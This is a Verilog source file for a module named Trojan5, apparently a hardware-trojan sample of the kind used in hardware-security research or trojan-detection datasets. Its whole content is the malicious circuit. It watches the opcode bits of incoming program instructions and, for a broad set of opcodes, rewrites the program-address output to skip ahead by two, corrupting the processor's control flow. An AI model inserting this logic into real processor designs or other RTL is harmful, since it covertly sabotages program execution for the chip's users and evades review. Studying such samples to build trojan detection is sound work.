module Trojan5 (
    input wire pon_rst_n_i,
    input wire [13:0] prog_dat_i,
    input wire [12:0] pc_reg,
    output wire [12:0] prog_adr_o
);

wire match_condition = (!pon_rst_n_i) ? 1'b0 :
                       (prog_dat_i[13:10] == 4'b1101) ? 1'b0 :
                       ((prog_dat_i[13:10] == 4'b1000) || (prog_dat_i[13:10] == 4'b1001) ||
                        (prog_dat_i[13:10] == 4'b1010) || (prog_dat_i[13:10] == 4'b1011) ||
                        (prog_dat_i[13:10] == 4'b0100) || (prog_dat_i[13:10] == 4'b0101) ||
                        (prog_dat_i[13:10] == 4'b0110) || (prog_dat_i[13:10] == 4'b0111) ||
                        (prog_dat_i[13:10] == 4'b1100)) ? 1'b1 : 1'b0;

assign prog_adr_o = match_condition ? pc_reg + 2 : pc_reg;

endmodule
